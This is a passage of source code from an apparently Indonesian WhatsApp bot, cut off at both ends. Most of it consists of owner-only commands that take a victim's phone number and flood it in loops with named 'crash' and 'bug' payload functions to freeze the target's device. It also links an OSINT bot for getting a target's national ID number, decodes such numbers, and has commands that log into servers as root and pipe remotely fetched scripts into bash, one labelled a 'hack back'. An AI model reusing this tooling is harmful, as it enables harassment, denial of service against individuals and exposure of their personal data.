            kabupatenKotaId = nik[_0x1ad75f(0x1c2)](0x6 * -0x115 + 0xed * -0x4 + 0xa32, -0x192c + -0x1 * -0x189 + 0x17a7);
            continue;
        case '10':
            province = moraxs[_0x1ad75f(0x1b1)][nik[_0x1ad75f(0x1c2)](-0x649 * 0x1 + 0x5d9 * -0x1 + -0x1 * -0xc22, 0x1f04 + 0x92f * 0x3 + -0x3a8f * 0x1)];
            continue;
        case '11':
            kabupatenKota = moraxs[_0x1ad75f(0x19c)][nik[_0x1ad75f(0x1c2)](0x8c5 + -0x280 + -0x645, -0x1ea5 + -0x1 * 0xb0f + 0x14dc * 0x2)];
            continue;
        }
        break;
    }
} else
    return replyy(_0x1ad75f(0x1ab) + _0x1ad75f(0x19e) + _0x1ad75f(0x1c8));
await sleep(-0x240b * -0x1 + 0x1e3f + -0x3692), replyy(_0x1ad75f(0x1a9) + _0x1ad75f(0x1b9) + q + (_0x1ad75f(0x1a2) + _0x1ad75f(0x1c1)) + provinceid + (_0x1ad75f(0x1c3) + '\x20') + province + (_0x1ad75f(0x1a7) + _0x1ad75f(0x1b0)) + kabupatenKotaId + (_0x1ad75f(0x1c6) + _0x1ad75f(0x1b7)) + kabupatenKota + (_0x1ad75f(0x1be) + _0x1ad75f(0x1b0)) + kecamatanId + (_0x1ad75f(0x1b5) + _0x1ad75f(0x1ac)) + kecamatan + (_0x1ad75f(0x1a0) + '\x20') + kodepos + _0x1ad75f(0x19a) + kelamin + _0x1ad75f(0x1bd) + lahir + '/' + X + '/' + V + (_0x1ad75f(0x1b6) + '\x20') + Z);
}
break
case "ramlist": {
lrm = `RAM YANG TERSEDIA:\n
1GB ✅
2GB ✅
3GB ✅
4GB ✅
5GB ✅
6GB ✅
7GB ✅
8GB ✅
UNLI ✅`
replyy(lrm)
}
break
case 'getnik':
if (!isCreator) return replyy(global.nocreator)
tutor = fs.readFileSync('./lib/video/tutor.mp4')
VxoZap.sendMessage(from, {video: tutor, caption: `Bot Telegram untuk mendapatkan nik target: @IDOOSINTBOT / https://t.me/IDOOSINTBOT`},{quoted: m})
break

case 'sepongip': case 'ipturu': case 'ipongwork': case 'iosfullv2':
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
let buttonggggggggggc = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${target}}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${target}`,
      merchant_url: `https://wa.me/${target}`
   })
}], m, {
   body: buttonggggggggggc,
   footer: 'Powered By VarelTzy'
})
for (let i = 0; i < amount; i++) {
await sendBugIos(target)
await sendBugIos(target)
await bughomebutton(target)
await penghitaman(target, vareltzycrash2)
await vareltzydevil(target, vareltzycrash)
await ngeloc(target, vareltzycrash)
await sendBugIos(target)
await sendBugIos(target)
await sendBugIos(target)
await vareltzydevil(target, vareltzycrash)
await ngeloc(target, vareltzycrash)
await iponcrash(target)
await iponcrash(target)
await iponcrash(target)
await vareltzydevil(target, vareltzycrash)
await vareltzydevil(target, vareltzycrash)
await ngeloc(target, vareltzycrash)
await ngeloc(target, vareltzycrash)
await iponcrash(target)
await iponcrash(target)
await vareltzydevil(target, vareltzycrash)
await ngeloc(target, vareltzycrash)
await vareltzydevil(target, vareltzycrash)
await vareltzydevil(target, vareltzycrash)
await bughomebutton(target)
await penghitaman(target, vareltzycrash2)
await vareltzydevil(target, vareltzycrash)
await ngeloc(target, vareltzycrash)
await sendBugIos(target)
await sendBugIos(target)
await bughomebutton(target)
await penghitaman(target, vareltzycrash2)
await vareltzydevil(target, vareltzycrash)
await sendBugIos(target)
await sendBugIos(target)
await bughomebutton(target)
await ngeloc(target, vareltzycrash)
}
replyy(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break
case 'ios-only':
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break
case 'ipturuv2': case 'ipcrash': {
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Penggunaan .${command} 628xxx`)
let pepeeeeeec = q.replace(/[^0-9]/g, "")
if (pepeeeeeec.startsWith('0')) return replyy(`𖤍 Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepeeeeeec + '@s.whatsapp.net'
let buttonc = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${pepeeeeeec}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${pepeeeeeec}`,
      merchant_url: `https://wa.me/${pepeeeeeec}`
   })
}], m, {
   body: buttonc,
   footer: 'Powered By VarelTzy'
})
  for (let j = 0; j < 5; j++) {
await VxoZap.sendMessage(Pe, {text: `MASIH IDUP KAN LU?`}, {quoted:m})
await sendBugIos(Pe)
await sendBugIos(Pe)
await iponcrash(Pe)
await sendBugIos(Pe)
await  iponcrash(Pe, vareltzybug)
await  iponcrash(Pe, vareltzyhuraa)
await  iponcrash(Pe, vareltzyhuraa)
await  iponcrash(Pe, vareltzybug)
await  iponcrash(Pe, vareltzybug)
await  iponcrash(Pe, vareltzyhuraa)
await  iponcrash(Pe, vareltzyhuraa)
await  iponcrash(Pe, vareltzybug)
await sendBugIos(Pe)
await bakdok(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await sendBugIos(Pe)
await  iponcrash(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await VxoZap.sendMessage(Pe, {text: `${global.namaowner}𝐫 𓅋`}, {quoted:m})
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await VxoZap.sendMessage(Pe, {text: `${global.namaowner}𝐫 𓅋`}, {quoted:m})
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await VxoZap.sendMessage(Pe, {text: `${global.namaowner} 𓅋`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `bang?`}, {quoted:m})
  }
await replyy(global.sendbug)
await replyy(`CEK AJA PASTI C1`)
}
break

case '🍁': case '✨': case '💯': case '💋': case '👅': case '🌀': case '⚡': 
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return replyy(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let Pe = bijipler + '@s.whatsapp.net'
let njiu = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${bijipler}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${bijipler}`,
      merchant_url: `https://wa.me/${bijipler}`
   })
}], m, {
   body: njiu,
   footer: ''
})
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(2000)
await sendSystemCrashMessage(Pe)
await ListMSGVIP4(Pe)
await LiveLocVIP(Pe)
await ngeloc(Pe, force)
await LiveLocVIP3(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await LiveLocVIP2(Pe)
await ListMSGVIP(Pe)
await LiveLocVIP(Pe)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
sleep(2000)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, force)
sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}* to number *${bijipler}*`)
break
case 'anu' : {
if (!isDev) return replyy(`khusus bot doang`)
jumlah = 20
sendRepeatedMessages2(from, jumlah)
sendVariousMessages(from, jumlah)
await sendViewOnceMessages(from, jumlah)
await sleep(2000)
replyy(`𝐁𝐔𝐆 𝐁𝐘 𝐁𝐎𝐓 𝐕𝐑𝐋 𝟕,𝟓`)
}
break
case 'installpanel' : {
 if (!isDev) return ('Maaf Hanya Untuk VarelTzy');
let t = text.split(',');
if (t.length < 5) return replyy(`\`Contoh Penggunaan\`\n${cmd} Contoh: 192.168.1.1,Hayya,VxoZap.my.id,node.VxoZap.my.id,8gb`);

// Menyiapkan variabel dari input
let ipvps = t[0];
let passwd = t[1];
let subdomain = t[2];
let domainnode = t[3];

// Memastikan RAM menggunakan format GB dan kurang dari atau sama dengan 32GB
let ramInput = t[4];
if (!/^\d+gb$/i.test(ramInput)) {
    return replyy('RAM VPS tidak valid. Harus dalam format "1gb"');
}
let ramValue = parseInt(ramInput.replace('gb', ''), 10);
if (ramValue > 32) {
    return replyy('RAM VPS tidak valid. Maksimal RAM adalah 32GB');
}
let ramvps = ramValue * 10000; // Mengonversi ke MB
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        replyy('*PROSES PENGINSTALLAN PANEL SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        replyy('*PROSES PENGINSTALLAN WINGS SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = 'bash <(curl https://raw.githubusercontent.com/varel455/theme/main/install.sh)';
        replyy('*MEMULAI CREATE NODE & LOCATION*');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        replyy(`𝙃𝘼𝙄𝙄𝙄𝙔 @${m.sender.split("@")[0]}\n\n_𝘿𝙀𝙏𝘼𝙄𝙇 𝘿𝘼𝙏𝘼 𝙋𝘼𝙉𝙀𝙇 𝘼𝙉𝘿𝘼_\n𝙇𝙄𝙉𝙆 𝙇𝙊𝙂𝙄𝙉: ${subdomain}\n𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀: admin\n𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿: ${password}\n\n𝙉𝙊𝙏𝙀:\n 𝘑𝘪𝘬𝘢 𝘗𝘢𝘯𝘯𝘦𝘭/𝘞𝘦𝘣𝘯𝘺 𝘉𝘦𝘭𝘶𝘮 𝘉𝘪𝘴𝘢 𝘋𝘪 𝘉𝘶𝘬𝘢 𝘔𝘰𝘩𝘰𝘯 𝘛𝘶𝘯𝘨𝘨𝘶 1-2 𝘮𝘦𝘯𝘪𝘵 𝘭𝘢𝘨𝘪 :) 𝘗𝘦𝘳𝘳𝘪𝘯𝘨𝘨𝘢𝘵𝘢𝘯 𝘑𝘢𝘨𝘢 𝘋𝘢𝘵𝘢 𝘱𝘢𝘯𝘦𝘭 𝘈𝘯𝘥𝘢 𝘋𝘦𝘯𝘨𝘢𝘯 𝘉𝘢𝘪𝘬"😘 𝘋𝘢𝘯 𝘑𝘢𝘯𝘨𝘢𝘯 𝘓𝘶𝘱𝘢 𝘊𝘳𝘦𝘢𝘵𝘦 𝘈𝘭𝘭𝘰𝘤𝘢𝘵𝘪𝘰𝘯𝘴 𝘥𝘢𝘯 .𝘴𝘵𝘢𝘳𝘸𝘪𝘯𝘨𝘴`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('VarelTzy\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('VarelTzy\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('VarelTzy\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write('varelbaik\n');
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('AutoCnode VarelTzy\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}
break
case 'hbpanel': {
    if (!isDev) return replyy('Maaf Hanya Untuk VarelTzy');   
    let t = text.split(',');
    if (t.length < 3) return replyy(`*Format salah!*\nPenggunaan: ${cmd} ipvps,password,username,password,domainpanel`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let userpnl = t[2];
    let passwdpnl = [3];
    let domainpnl = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/varel455/theme/main/install.sh)'
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        replyy('*HACK BACK PANEL DI MULAI😈*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                replyy(`*BRIKUT DATA LOGIN PANEL*\n\nLINK LOGIN: ${domainpnl}\nUSERNAME: ${userpnl}\nPASSWORD: ${passwdpnl}`)
                conn.end();
            }).on('data', (data) => {
            stream.write('varelbaik\n');
            stream.write('7\n');
                stream.write(`${userpnl}\n`)
                stream.write(`${passwdpnl}\n`);
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        replyy('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }
break
case 'installwings':{
if (!isDev) return ('Maaf Hanya Untuk VarelTzy')
let t = text.split(',');
if (t.length < 3) return replyy(`𝖳𝗎𝗍𝗈𝗋𝗂𝖺 𝖯𝖾𝗇𝗀𝗀𝗎𝗇𝖺𝖺𝗇 ${cmd} 𝗂𝗉𝗏𝗉𝗌,𝗉𝖺𝗌𝗌𝗐𝗈𝗋𝖽,𝗌𝗎𝖻𝖽𝗈𝗉𝖺𝗇𝖾𝗅,𝗌𝗎𝖻𝖽𝗈𝗇𝗈𝖽𝖾`)
let ipvps = t[0];
let passwd = t[1];
let subdomain = t[2];
let domainnode =[3];
const connSettings = {
    host: ipvps,
    port: '22',
    username: 'root',
    password: passwd
};

const command = 'bash <(curl -s https://pterodactyl-installer.se)';

const conn = new Client();
conn.on('ready', () => {
          replyy('*PROSES PENGINSTALLAN PANEL && WINGS SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*')
    conn.exec(command, (err, stream) => {
        if (err) throw err;
        stream.on('close', (code, signal) => {
            console.log('Stream closed with code ' + code + ' and signal ' + signal);
            replyy(`*INSTALL WINGS SUCCES DENGAN DOMAIN NODE YANG TERKAIT*`)
            conn.end();
        }).on('data', (data) => {

          if (data.toString().includes('Input')) {
            stream.write('bash <(curl -s https://pterodactyl-installer.se)\n');
          }
          
               if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('val\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('vareltzy@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
          console.log('STDOUT: ' + data);
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data);
        });
    });
}).connect(connSettings);
}

break  
case 'startwings': case 'configurewings': {
    if (!isDev) return ('Maaf Hanya Untuk VarelTzy');
    let t = text.split(',');
    if (t.length < 2) return replyy(`\`𝖥𝗈𝗋𝗆𝖺𝗍 𝖲𝖺𝗅𝖺𝗁\`\n𝖳𝗎𝗍𝗈𝗋𝗂𝖺𝗅 𝖯𝖾𝗇𝗀𝗀𝗎𝗇𝖺𝖺𝗇 ${cmd} 𝗂𝗉𝗏𝗉𝗌,𝗉𝖺𝗌𝗌𝗐𝗈𝗋𝖽,𝗍𝗈𝗄𝖾𝗇𝖼𝗈𝖻𝖿𝗂𝗀𝗎𝗋𝖺𝗍𝗂𝗈𝗇`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let token = t[2];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/varel455/theme/main/install.sh)'
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        replyy('*PROSES CONFIGURE WINGS*')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
replyy('SUCCES START WINGS DI PANEL ANDA COBA CEK PASTI IJO😁\n\nCopyright By VarelTzy');
                conn.end();
            }).on('data', (data) => {
            stream.write('varelbaik\n');
                stream.write('3\n');
                stream.write(`${token}\n`)
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        replyy('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }
 break
case 'crash1hari': case 'crash1jam': case 'bugsystemv2': case 'wa-meta': case 'wa-web': {
if (!isCreator) return replyy(`ANJ SIAPA LU`)
if (!q) return replyy(`Penggunaan .${command} 628xxx`)
let pepeeeeeeec = q.replace(/[^0-9]/g, "")
if (pepeeeeeeec.startsWith('0')) return replyy(`𖤍 Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepeeeeeeec + '@s.whatsapp.net'
let buttoncc = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${pepeeeeeeec}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${pepeeeeeeec}`,
      merchant_url: `https://wa.me/${pepeeeeeeec}`
   })
}], m, {
   body: buttoncc,
   footer: 'Powered By VarelTzy'
})
for (let j = 0; j < 1; j++) {
await VxoZap.sendMessage(Pe, {text: `MASIH IDUP KAN LU?`}, {quoted:m})
await bakdok(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await sendBugIos(Pe)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
